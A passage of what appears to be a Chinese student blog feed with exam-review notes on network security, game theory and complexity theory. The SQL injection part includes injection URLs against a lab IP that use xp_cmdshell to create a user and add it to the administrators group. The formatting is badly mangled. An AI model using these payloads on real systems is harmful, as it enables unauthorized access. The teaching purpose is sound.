/></li><li>DNS解析路径劫持：<ul><li>第一类劫持方法是<strong>请求转发</strong>，用户的DNS请求将直接定向到其他的服务器，此时，权威域名服务器只收到来自这个服务器的请求，用户指定的公共DNS服务器完全排除在外</li><li>第二类劫持方法是<strong>请求复制</strong>，用户的DNS请求被网络中间设备复制，一份去往原来目的地，一份去往劫持者使用的解析服务器，此时，权威域名服务器将收到两个相同的查询</li><li>第三类劫持方法是直接应答，用户发生的请求同样被转发，但解析服务器并未进行后续查询而是直接返回一个响应，此时，权威域名服务器没有收到任何查询，但是客户端收到解析结果</li></ul></li></ul></li></ul></li></ul></li></ul></li><li><p>安全威胁：</p><ul><li>协议脆弱性：<ul><li>网络通信攻击：DNS域名解析过程劫持；劫持解析路径，并伪装成指定的DNS应答</li></ul></li><li>实现脆弱性：<ul><li>DNS软件，BIND漏洞和缺陷带来威胁；缓冲区溢出漏洞；</li></ul></li><li>操作脆弱性：<ul><li>人为操作或配置错误带来的安全隐患：域名配置攻击、域名注册攻击和信息泄露</li></ul></li></ul></li></ul><h2 id="安全多方计算"><a href="#安全多方计算" class="headerlink" title="安全多方计算"></a>安全多方计算</h2><h3 id="a-主要技术路线分类"><a href="#a-主要技术路线分类" class="headerlink" title="a) 主要技术路线分类"></a>a) 主要技术路线分类</h3><ul><li>主要三种技术路线：基于密码学的安全多方计算、联邦学习、可信硬件TEE</li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702155607526.png" alt="image-20230702155607526" style="zoom:67%;" /></li></ul><h3 id="b-基础秘密分享协议，三元加法分享、三元乘法分享等"><a href="#b-基础秘密分享协议，三元加法分享、三元乘法分享等" class="headerlink" title="b) 基础秘密分享协议，三元加法分享、三元乘法分享等"></a>b) 基础秘密分享协议，三元加法分享、三元乘法分享等</h3><h4 id="基础密码分享协议"><a href="#基础密码分享协议" class="headerlink" title="基础密码分享协议"></a><font color=pink><strong>基础密码分享协议</strong></font></h4><ul><li>Shamir门限：秘密s分成n份，每个参与方获得一份；拆分时规定至少t个参与者聚在一起才可以恢复s，少于t个参与者无法恢复<ul><li>原理：任意一个t-1次多项式函数，已知t个点就能求解</li><li>过程：<img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702163151856.png" alt="image-20230702163151856" style="zoom:67%;" /></li><li>恢复：<img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702163211757.png" alt="image-20230702163211757" style="zoom:67%;" /></li></ul></li></ul><h4 id="三元加法分享"><a href="#三元加法分享" class="headerlink" title="三元加法分享"></a><font color=pink><strong>三元加法分享</strong></font></h4><ul><li>Replicated2-out-of-3算数秘密分享：<ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702163335792.png" alt="image-20230702163335792" style="zoom: 67%;" /></li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702163450021.png" alt="image-20230702163450021" style="zoom:67%;" /></li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702164115793.png" alt="image-20230702164115793" style="zoom:67%;" /></li></ul></li></ul><h4 id="三元乘法分享"><a href="#三元乘法分享" class="headerlink" title="三元乘法分享"></a><font color=pink><strong>三元乘法分享</strong></font></h4><ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702164138616.png" alt="image-20230702164138616"></li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702164158219.png" alt="image-20230702164158219"></li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702164218886.png" alt="image-20230702164218886" style="zoom:67%;" /></li><li>每个计算方要知道三份秘密份额(z1,z2,z3)中的两份<ul><li>P1将自己份额z1发给P2</li><li>P2将自己份额z2发给P3</li><li>P3将自己份额z3发给P1</li></ul></li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702164435585.png" alt="image-20230702164435585"></li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702164453305.png" alt="image-20230702164453305" style="zoom:67%;" /></li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702164509514.png" alt="image-20230702164509514" style="zoom:80%;" /></li></ul><h2 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h2><h3 id="a-万维网，主要的体系架构"><a href="#a-万维网，主要的体系架构" class="headerlink" title="a) 万维网，主要的体系架构"></a>a) 万维网，主要的体系架构</h3><ul><li>万维网：简称Web，采用链接的方式使互联网用户能够非常方便地从因特网上的一个站点访问另一个站点‘基于超文本传输协议的、全球性的、动态交互的、跨平台的分布式图形信息系统</li><li>主要漏洞：SQL注入漏洞、跨站脚本漏洞</li><li><p>体系结构：<img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702170052550.png" alt="image-20230702170052550" style="zoom:67%;" /></p><ul><li>万维网以客户服务器方式工作</li><li>用户计算机上运行的客户程序叫做浏览器</li><li>万维网文档所驻留的计算机称为万维网服务器或Web服务器</li><li>客户程序通过HTTP/HTTPS协议向服务器程序发出请求，服务器程序向客户程序返回万维网文档</li><li>在一个客户程序主窗口显示的万维网文档称为页面</li><li>Web应用程序，一般使用C++，JSP，PHP等语言开发</li><li>Web应用程序把处理结果以页面的形式返回给客户端</li><li>Web应用的数据一般保存在数据库中</li></ul></li><li><p>跨站被动攻击：跨站请求伪造(CSRF)，跨站脚本攻击(XSS)和HTTP消息头注入攻击</p></li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702172327938.png" alt="image-20230702172327938" style="zoom:67%;" /><ul><li>Domain表示Cookie发送对象服务器的域名，不指定则Cookie只发送到生成它的服务器，发送范围小，安全性高。</li></ul></li></ul><h3 id="b-SQL注入攻击及防范，典型的SQL注入过程"><a href="#b-SQL注入攻击及防范，典型的SQL注入过程" class="headerlink" title="b) SQL注入攻击及防范，典型的SQL注入过程"></a>b) SQL注入攻击及防范，典型的SQL注入过程</h3><ul><li>结构化查询语言SQL</li><li>SQL注入攻击通过构建特殊的输入作为参数传入Web应用程序，这些输入大多是SQL语法里的一些组合，通过执行SQL语言进而执行攻击者想要的操作。</li><li>SQL注入攻击以网站数据库为目标，利用Web应用程序对特殊字符过滤不完全的缺陷，通过把构造的SQL命令插入Web表单递交或输入域名或页面请求的查询字符串中，欺骗服务器执行恶意的SQL命令，最终非法访问网站数据库、篡改内容、绕过认证等。</li></ul><h4 id="典型SQL注入过程"><a href="#典型SQL注入过程" class="headerlink" title="典型SQL注入过程"></a><font color=pink><strong>典型SQL注入过程</strong></font></h4><ul><li><p>```<br>url链接 + and 1=1<br><a href="http://26.28.249.154/asd/wyqy/and">http://26.28.249.154/asd/wyqy/and</a> 1=1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ ```</span><br><span class="line">  url链接 + and 1=2</span><br><span class="line">  http://26.28.249.154/asd/wyqy/and 1=2</span><br></pre></td></tr></table></figure></li><li><p>两次结果不同，可能存在注入漏洞</p></li><li><p>判断是否是sysadmin(SA)权限，构造注入语句：</p></li><li><p>```<br><a href="http://26.28.249.154/asd/wyqy/and">http://26.28.249.154/asd/wyqy/and</a> 1=(select is_srvrolemember(‘sysadmin’))</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  + 页面正常返回说明链接数据库权限是sysadmin</span><br><span class="line"></span><br><span class="line">+ 增加一个test用户(以该靶场为例)</span><br><span class="line"></span><br><span class="line">+ ```</span><br><span class="line">  http://26.28.249.154/asd/wyqy/execmaster..xp_cmdshell&#x27;net user test test/add&#x27;--</span><br></pre></td></tr></table></figure></li><li><p>增加到管理员组</p></li><li><pre><code>http://26.28.249.154/asd/wyqy/execmaster..xp_cmdshell&#39;net localgroup administrators test /add&#39;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### &lt;font color=pink&gt;**注入原理**&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">+ 构造永真逻辑：</span><br><span class="line"></span><br><span class="line">  + ```</span><br><span class="line">    SELECT * FROM USERS WHERE SSN=&#x27; 1234&#x27; OR &#x27;1&#x27;= &#x27;1 &#x27;</span><br></pre></td></tr></table></figure>+ 即注入信息为：+</code></pre><p>  1234’ OR ‘1’ = ‘1</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  + 结果返回数据库的每一个用户</span><br><span class="line"></span><br><span class="line">+ 攻击流程：</span><br><span class="line"></span><br><span class="line">  + Web程序提供了用户输入的表单</span><br><span class="line">  + 攻击者通过填写表单数据发起攻击</span><br><span class="line">  + Web程序通过SQL语句的形式将攻击递交给数据库</span><br><span class="line">  + 数据库执行SQL语句，将执行结果加密后返回给应用程序</span><br><span class="line">  + 应用程序揭秘数据，将结果发送给用户，即攻击者</span><br><span class="line"></span><br><span class="line">+ 注入检测：</span><br><span class="line"></span><br><span class="line">  + &lt;img src=&quot;https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702184708091.png&quot; alt=&quot;image-20230702184708091&quot; style=&quot;zoom:67%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  + 整型参数的SQL注入漏洞探测：</span><br><span class="line"></span><br><span class="line">    + 在abc.asp中SQL语句大致如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>select * from 表名 where 字段 = YY<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 以下三种情况全满足，则abc.asp一定存在SQL注入</span><br><span class="line"></span><br><span class="line">+ **在URL中附加单引号：**</span><br><span class="line"></span><br></pre></td></tr></table></figure>http://xxx.xxx.xxx/abc.asp?p=YY’<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 此时abc.asp中的SQL语句变成</span><br><span class="line"></span><br></pre></td></tr></table></figure>  select * from 表名 where 字段=YY’  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  + 测试结果：abc.asp运行异常</span><br><span class="line"></span><br><span class="line">+ **在URL链接中附加字符串and 1=1：**</span><br><span class="line"></span><br></pre></td></tr></table></figure>http://xxx.xxx.xxx/abc.asp?p=YY and 1=1<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  + 测试结果：abc.asp运行正常，且与初始运行结果一致</span><br><span class="line"></span><br><span class="line">+ **在URL链接中附加字符串and 1=2：**</span><br><span class="line"></span><br></pre></td></tr></table></figure>http://xxx.xxx.xxx/abc.asp?p=YY and 1=2<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    + 测试结果：abc.asp运行异常</span><br><span class="line"></span><br><span class="line">+ 字符串型参数SQL注入漏洞检测：</span><br><span class="line"></span><br><span class="line">  + 在abc.asp中SQL语句大致如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure>select * from 表名 where 字段 = ‘YY&#39;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 以下三种情况全满足，则abc.asp一定存在SQL注入</span><br><span class="line"></span><br><span class="line">+ **在URL链接中附加一个单引号**</span><br><span class="line"></span><br></pre></td></tr></table></figure>http://xxx.xxx.xxx/abc.asp?p=YY’<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  + 测试结果：运行异常</span><br><span class="line"></span><br><span class="line">+ **在URL链接中附加字符串‘and ‘1’=‘1：**</span><br><span class="line"></span><br></pre></td></tr></table></figure>http://xxx.xxx.xxx/abc.asp?p=YY’ and &#39;1&#39;=&#39;1<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  + 测试结果：运行正常，且与初始结果相同</span><br><span class="line"></span><br><span class="line">+ **在URL链接中附加字符串‘and ’1‘=’2：**</span><br><span class="line"></span><br></pre></td></tr></table></figure>http://xxx.xxx.xxx/abc.asp?p=YY&#39; and &#39;1&#39;=&#39;2```+ 测试结果：运行异常</code></pre></li></ul><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a><font color=pink><strong>防御</strong></font></h4><ul><li>由于SQL注入攻击的Web应用程序运行在应用层，对于绝大多数防火墙，这种攻击是合法的，解决应该依赖于完善编程：<ul><li>过滤单引号：过滤特殊字符</li><li>在构造动态SQL语句时，一定使用类安全的参数编码机制</li><li>禁止将敏感性数据以明文存放在数据库中</li><li>遵循最小特权原则：只给访问数据库的Web应用所需的最低权限，撤销不必要的公共许可</li><li>尽量不要使用动态拼装的SQL</li><li>应用异常信息应该给出尽可能少的提示</li></ul></li><li>防御XSS(跨站脚本攻击)：<ul><li>对Web程序的所有输入进行过滤，对危险HTML字符编码</li><li>用户培训</li><li>防止访问已知的恶意网站</li><li>执行手工或者自动化代码扫描，确定并消除潜在的XSS漏洞</li></ul></li></ul>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E5%A4%A7%E5%AD%A6/">大学</category>
      
      <category domain="http://example.com/categories/%E5%A4%A7%E5%AD%A6/%E5%A4%A7%E4%B8%89%E4%B8%8B/">大三下</category>
      
      <category domain="http://example.com/categories/%E5%A4%A7%E5%AD%A6/%E5%A4%A7%E4%B8%89%E4%B8%8B/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</category>
      
      
      <category domain="http://example.com/tags/%E5%A4%8D%E4%B9%A0/">复习</category>
      
      
      <comments>http://example.com/2023/06/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>博弈论复习</title>
      <link>http://example.com/2023/06/28/%E5%8D%9A%E5%BC%88%E8%AE%BA/</link>
      <guid>http://example.com/2023/06/28/%E5%8D%9A%E5%BC%88%E8%AE%BA/</guid>
      <pubDate>Wed, 28 Jun 2023 12:00:30 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;博弈论&quot;&gt;&lt;a href=&quot;#博弈论&quot; class=&quot;headerlink&quot; title=&quot;博弈论&quot;&gt;&lt;/a&gt;博弈论&lt;/h1&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="博弈论"><a href="#博弈论" class="headerlink" title="博弈论"></a>博弈论</h1><span id="more"></span><h2 id="完全信息静态博弈"><a href="#完全信息静态博弈" class="headerlink" title="完全信息静态博弈"></a>完全信息静态博弈</h2><ul><li>参与人：博弈中选择行动来最大化效应的决策主体；</li><li>行动：参与人在博弈中的某个时间点的决策变量</li><li>战略：参与人的行动规则，规定了参与人在每一种轮到自己行动的情形下应采取的行动。与行动的顺序相关，是行动的有序集。</li><li>支付/效用函数</li></ul><h3 id="战略式博弈"><a href="#战略式博弈" class="headerlink" title="战略式博弈"></a>战略式博弈</h3><p>战略式博弈是一种相互作用的决策模型，这种模型假设<font color=red>每个参与人仅选择一次行动或战略</font>，并且<font color=red>所有参与人的选择是同时进行的</font>。完全信息静态博弈最适合用战略式博弈描述。</p><h3 id="占优战略"><a href="#占优战略" class="headerlink" title="占优战略"></a>占优战略</h3>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E5%A4%A7%E5%AD%A6/">大学</category>
      
      <category domain="http://example.com/categories/%E5%A4%A7%E5%AD%A6/%E5%A4%A7%E4%B8%89%E4%B8%8B/">大三下</category>
      
      <category domain="http://example.com/categories/%E5%A4%A7%E5%AD%A6/%E5%A4%A7%E4%B8%89%E4%B8%8B/%E5%8D%9A%E5%BC%88%E8%AE%BA/">博弈论</category>
      
      
      <category domain="http://example.com/tags/%E5%A4%8D%E4%B9%A0/">复习</category>
      
      
      <comments>http://example.com/2023/06/28/%E5%8D%9A%E5%BC%88%E8%AE%BA/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>复杂性理论测试卷</title>
      <link>http://example.com/2023/06/28/%E5%A4%8D%E6%9D%82%E6%80%A7%E7%90%86%E8%AE%BA%E6%B5%8B%E8%AF%95%E5%8D%B7/</link>
      <guid>http://example.com/2023/06/28/%E5%A4%8D%E6%9D%82%E6%80%A7%E7%90%86%E8%AE%BA%E6%B5%8B%E8%AF%95%E5%8D%B7/</guid>
      <pubDate>Wed, 28 Jun 2023 02:02:10 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;复杂性理论测试&quot;&gt;&lt;a href=&quot;#复杂性理论测试&quot; class=&quot;headerlink&quot; title=&quot;复杂性理论测试&quot;&gt;&lt;/a&gt;复杂性理论测试&lt;/h1&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="复杂性理论测试"><a href="#复杂性理论测试" class="headerlink" title="复杂性理论测试"></a>复杂性理论测试</h1><span id="more"></span><p>判断题</p><p>2.停机问题是不可判定的，无法用任何算法求解。1</p><p>3.素数问题PRIME是典型的NP问题而非P问题。1</p><p>4.时间复杂度函数n(n-1)/2∈Θ(n^3)and∈Ω(n^2).0</p><p>5.超越多项式时间复杂度的精确算法一般是不可接受的。1</p><p>6.递归算法的简洁性可能会掩盖它的低效率。0</p><p>7.只要解决NPC中的任何一个问题，即找到其多项式求解算法， 那么所有的NP问题都能得到解决。1</p><p>8.所有的语言构成的集合不可数，因此语言的个数比TM个数多，因此一定有TM无法识别的语言。1</p><p>9.如果一个算法不能用图灵机来描述，也必定不能在一台物理机上实现；反之如果一个算法能在一台物理机上实现，也必定可以用图灵机来描述。1</p><p>10.任何一个多带TM都等价于某个单带TM。1</p><p>单选题20’</p><p>1.下列不属于NPC问题的是 </p><p>旅行商问题 顶点覆盖问题 <strong><em>\</em>2SAT**</strong> 完全子图问题</p><p>2.下列不属于算法特性的是</p><p>正确性 一般性 高效性 <strong><em>\</em>简洁性**</strong></p><p>3.如果P≠NP，下列说法不正确的是</p><p><strong>NPC是NP层面比较难的问题</strong>  NPC∈NP</p><p>NP hard问题比NP难     NPC∈NP hard</p><p>4.下列关于算法复杂性理论说法不正确的是</p><p>算法理论其目标是寻找某个问题的最佳算法</p><p>复杂性理论关心求解问题所需资源的下界</p><p>复杂性理论是密码学的基础</p><p><strong><em>\</em>复杂性理论证明某个问题不能有效求解，则该问题没什么意义和价值**</strong></p><p>5.下列断言为假的是</p><p>n(n+1)/2∈O(n^3） n(n+1)/2∈O(n^2）</p><p><strong><em>\</em>n(n+1)/2∈Θ*<em>**</em></strong>*(*<strong>**</strong>*n^3*<strong>**</strong>*)*<em>*</em>  n(n+1)/2∈Ω(n)</p><p>\6. 下列关于算法效率分析说法不正确的是</p><p>A、最优效率分析运远不如最差效率分析重要.</p><p>B、平均效率的分析比最差效率和最优效率的分析难很多</p><p>C、<strong><em>\</em>可以用最差效率和最优效率的平均数方法来求平均效率**</strong></p><p>D、如展一个算法的最优效率不能满足要求，则可以抛弃</p><p>7.在计算复杂性理论中，将所有在多项式时间内可求解的问题和可验证的问题分别称之为</p><p>NP和NPC问题   <strong><em>\</em>P*<em>**</em></strong>*问题和N*<strong>**</strong>*P*<strong>**</strong>*问题*<em>*</em></p><p>NP问题和P问题  NPC问题和P问题</p><p>8.下列属于P问题的是</p><p><strong><em>\</em>P*<em>**</em></strong>*ATH*<strong>**</strong>*问题*<em>*</em> HAMPATH问题 3-COLOR问题 CLIQUE问题</p><p>9.关于归约的说法不正确的是</p><p>归约的过程只有用多项式时间完成才有意义</p><p>问题A可归约为问题B，说明问题A不比问题B难</p><p>归约之间存在传递性</p><p><strong><em>\</em>S*<em>**</em></strong>*AT*<strong>**</strong>*是N*<strong>**</strong>*PC*<strong>**</strong>*问题，如果一个问题可以归约到S*<strong>**</strong>*AT*<strong>**</strong>*，则该问题必定是N*<strong>**</strong>*PC*<em>*</em></p><p>10.下列说法不正确的是</p><p>图灵是计算机理论之父和人工智能之父</p><p><strong><em>\</em>图灵命题已被证明是定理**</strong></p><p>图灵测试奠定了人工智能的基础</p><p>图灵机是冯诺依曼设计的物理机器的基础</p><p>简答题25’</p><p>1.是否可以写出一个程序来判断另一个程序停机？</p><p> 不能，</p><p>2.如何从图灵机角度看待算法的时间复杂度和空间复杂度？</p><p> 步数和方格数</p><p>3.实际应用中如何判定一个问题是NPC问题？第一个NPC问题是怎么发现的？</p><p>是否是NP问题，已知NPC问题是否能归约到它；</p><p>1971年库克教授在论文中提出了第一个NPC问题并给出了证明。这使得世人知道了这类NPC问题是真的存在的。库克教授给出的这第一个NPC问题叫做“SAT问题”，又称作“可满足性问题”，英文为“The Satisfiability Problem”，SAT是Satisfiability单词的前三个字母。“SAT问题是一个NPC问题”这个结论被称作库克定理</p><p>4.算法提升的本质是什么？提升算法效率的方法有哪些？</p><p> 效率；减少数据冗余，优化循环、减少嵌套，避免大量使用递归；</p><p>5.谈谈你对计算复杂性理论的认识，并举一个简单的安全或有关的实例说明。</p><p> 1.算法设计的重要性：计算复杂性理论告诉我们，并非所有的问题都可以通过高效的算法解决。对于某些问题，可能不存在多项式时间内解决它们的算法。因此，在学习算法设计和问题求解时，需要考虑问题的复杂性，并寻找合适的算法来解决。</p><p>2.问题的可证明性：计算复杂性理论研究问题的难解性和可解性，它提供了一种形式化的框架来研究问题是否可以在有效的时间内解决。这启发我们思考问题的本质和边界，以及寻找问题的可证明性和难解性。</p><p>3.理论与实践的结合：计算复杂性理论不仅仅关注问题的理论分析，还与实际问题密切相关。它为算法设计和问题求解提供了基本的指导原则和方法。通过理解计算复杂性理论，我们可以更好地理解和设计高效的算法，提高计算问题的解决效率。</p><p>4.密码学和安全性的研究：计算复杂性理论对密码学和安全性的研究有重要的影响。它提供了分析密码算法安全性的工具和方法，帮助我们设计和评估安全的加密算法</p><p>综合分析题20’</p><p>1.证明定理：如果t1(n)∈O(g1(n))并且t2(n)∈O(g2(n))，则t1(n)+ t2(n)∈O(max{ g1(n), g2(n)})</p><p> 定义法；</p><p>2.写出将十进制正整数转换为二进制的标准算法。</p><p>a.用伪代码描述该算法。</p><p>b.分析算法时间复杂度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">M=[]</span><br><span class="line">c=A</span><br><span class="line"><span class="keyword">while</span>(c!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    b = c%<span class="number">2</span></span><br><span class="line">c = c/<span class="number">2</span></span><br><span class="line">M = append(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.设计一个图灵机M，使之接受语言L={w#w | w∈(0,1)*}，画出L（M）的状态转移图，并用简单实例进行验证。</p><p>​                                 <img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230628103847455.png" alt="image-20230628103847455"></p>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E5%A4%A7%E5%AD%A6/">大学</category>
      
      <category domain="http://example.com/categories/%E5%A4%A7%E5%AD%A6/%E5%A4%A7%E4%B8%89%E4%B8%8B/">大三下</category>
      
      <category domain="http://example.com/categories/%E5%A4%A7%E5%AD%A6/%E5%A4%A7%E4%B8%89%E4%B8%8B/%E5%A4%8D%E6%9D%82%E6%80%A7%E7%90%86%E8%AE%BA/">复杂性理论</category>
      
      
      <category domain="http://example.com/tags/%E5%A4%8D%E4%B9%A0/">复习</category>
      
      
      <comments>http://example.com/2023/06/28/%E5%A4%8D%E6%9D%82%E6%80%A7%E7%90%86%E8%AE%BA%E6%B5%8B%E8%AF%95%E5%8D%B7/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>复杂性理论复习</title>
      <link>http://example.com/2023/06/26/%E5%A4%8D%E6%9D%82%E6%80%A7%E7%90%86%E8%AE%BA%E5%A4%8D%E4%B9%A0/</link>
      <guid>http://example.com/2023/06/26/%E5%A4%8D%E6%9D%82%E6%80%A7%E7%90%86%E8%AE%BA%E5%A4%8D%E4%B9%A0/</guid>
      <pubDate>Mon, 26 Jun 2023 06:58:32 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;复杂性理论复习综述&quot;&gt;&lt;a href=&quot;#复杂性理论复习综述&quot; class=&quot;headerlink&quot; title=&quot;复杂性理论复习综述&quot;&gt;&lt;/a&gt;复杂性理论复习综述&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;理论计算机的核心目标：&lt;/strong&gt;&lt;/p&gt;
&lt;font color=red&gt;把计算任务按照其本质难度进行分类&lt;/font&gt;                                                     ![image-20230626150513090](https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230626150513090.png)



&lt;font color=red&gt;复习重点：判定问题；图灵机构造和基本思想；什么是P、NP、NPC问题及NP问题之间的规约和常见的NPC问题；SAT、2SAT、3SAT问题；递归算法和非递归算法特点和区别；复杂度分析方法区别；会写素数判定的递归和非递归算法&lt;/font&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="复杂性理论复习综述"><a href="#复杂性理论复习综述" class="headerlink" title="复杂性理论复习综述"></a>复杂性理论复习综述</h1><p><strong>理论计算机的核心目标：</strong></p><font color=red>把计算任务按照其本质难度进行分类</font>                                                     ![image-20230626150513090](https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230626150513090.png)<font color=red>复习重点：判定问题；图灵机构造和基本思想；什么是P、NP、NPC问题及NP问题之间的规约和常见的NPC问题；SAT、2SAT、3SAT问题；递归算法和非递归算法特点和区别；复杂度分析方法区别；会写素数判定的递归和非递归算法</font><span id="more"></span><h2 id="1-什么是可计算问题？什么是不可计算问题？"><a href="#1-什么是可计算问题？什么是不可计算问题？" class="headerlink" title="1.什么是可计算问题？什么是不可计算问题？"></a>1.什么是可计算问题？什么是不可计算问题？</h2><font color=pink>可计算问题</font>当且仅当该问题可以在图灵机上经过有限步骤后可以得到正确的结果。相反地，不能由图灵机解决的问题叫做<font color=pink>不可计算问题</font>。## 2.什么是计算复杂性？计算复杂性理论主要研究什么？<font color=pink>计算复杂性</font>就是用计算机求解问题的难易程度，使用数学方法对计算中所需的各种资源消耗作定量的分析，并研究各类问题之间在计算复杂程度上的相互关系和性质。                                                                                                                      <font color=pink>主要研究</font>计算问题时所需要的资源，比如时间和空间，以及如何尽可能的节省这些资源。## 3.什么是算法？算法有哪些特点？<font color=pink>算法</font>是对解决方案的准确而完整的描述。                                                                                                                                          <font color=pink>特点</font>：有穷性，可行性，确定性，输入和输出## 4.描述算法的方法有？自然语言、流程图、N-S图、伪代码、程序设计语言## <font color=red>5.如何分析算法的效率？</font><p>算法的效率分析指对算法在运行时间和存储空间这两种资源的利用效率进行研究。对于一般算法，关注其输入规模，运行时间的度量单位，增长效率和算法的最优最差平均效率；对于递归算法，则需要关注递归的深度，先对算法建立一个递归关系，设置初始条件，再求解分析。</p><h2 id="6-渐进表达式O-g-n-，Θ-g-n-，Ω-g-n-的定义和表达含义？"><a href="#6-渐进表达式O-g-n-，Θ-g-n-，Ω-g-n-的定义和表达含义？" class="headerlink" title="6.渐进表达式O(g(n))，Θ(g(n))，Ω(g(n))的定义和表达含义？"></a><font color=red>6.渐进表达式O(g(n))，Θ(g(n))，Ω(g(n))的定义和表达含义？</font></h2><font color=pink>O(g(n))</font>：如果函数t(n)包含在O(g(n))中，对于所有足够大的n，t(n)的上界由g(n)的常数倍确定，即存在大于0的常数和非负的整数n0使得对于所有的 n≥n0 ，有 cg(n)≥t(n)表达含义：g(n)≥该算法的时间复杂度<font color=pink>Θ(g(n))</font>：如果函数t包含在Θ(g(n))中，对于所有足够大的n，t(n)的上下界都由g的常数倍确定，即存在大于0的常数c1,c2和非负的整数n0使得所有 n≥n0 ，有 